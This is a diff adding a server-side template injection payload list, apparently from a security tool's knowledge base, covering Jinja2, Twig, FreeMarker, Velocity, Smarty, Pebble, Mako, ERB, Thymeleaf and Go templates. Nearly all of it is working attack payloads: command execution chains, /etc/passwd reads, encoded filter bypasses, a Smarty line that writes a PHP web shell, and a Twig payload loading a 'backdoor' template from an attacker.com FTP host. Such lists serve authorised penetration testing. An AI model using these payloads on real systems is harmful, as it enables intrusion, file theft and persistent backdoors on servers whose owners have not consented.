@@ -1,0 +1,93 @@
+# SSTI (Server-Side Template Injection) Payloads
+# WardenStrike Knowledge Base
+
+# ─── Detection (polyglot) ───────────────────────────────────────
+{{7*7}}
+${7*7}
+#{7*7}
+*{7*7}
+@{7*7}
+{{7*'7'}}
+${7*'7'}
+<%= 7*7 %>
+{{config}}
+${class.getResource('/etc/passwd').text}
+
+# ─── Jinja2 (Python / Flask) ────────────────────────────────────
+# Detection
+{{7*7}}           -> 49
+{{7*'7'}}         -> 7777777
+
+# RCE via config
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# RCE via subclasses
+{{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# File read
+{{open('/etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+
+# Bypass with attr
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+# ─── Twig (PHP) ─────────────────────────────────────────────────
+{{7*7}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{app.request.server.all|join(',')}}
+{{'/etc/passwd'|file_excerpt(1,30)}}
+{{_self.env.setCache("ftp://attacker.com:2121")}}{{_self.env.loadTemplate("backdoor")}}
+
+# ─── FreeMarker (Java) ──────────────────────────────────────────
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation()}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex("id")}
+
+# ─── Velocity (Java) ────────────────────────────────────────────
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+# ─── Smarty (PHP) ────────────────────────────────────────────────
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('id')}
+{php}system($_GET['cmd']);{/php}
+
+# ─── Pebble (Java) ──────────────────────────────────────────────
+{{'a'.toUpperCase()}}
+{{ someString.toUPPERCASE() }}
+{% set cmd = 'id' %}{{['bash', '-c', cmd] | join | exec}}
+
+# ─── Mako (Python) ──────────────────────────────────────────────
+${self.module.cache_region("a","b")}
+${self.module.__dict__['__builtins__']['__import__']('os').popen('id').read()}
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+
+# ─── ERB (Ruby) ─────────────────────────────────────────────────
+<%= 7 * 7 %>
+<%= `id` %>
+<%= File.open('/etc/passwd').read %>
+<%= system('id') %>
+
+# ─── Thymeleaf (Java/Spring) ────────────────────────────────────
+[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
+__${T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")}__::.x
+[(${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String[]){"sh","-c","id"}).getInputStream())})]
+
+# ─── Golang template ─────────────────────────────────────────────
+{{7*7}}
+{{.}}
+{{printf "%s" "test"}}
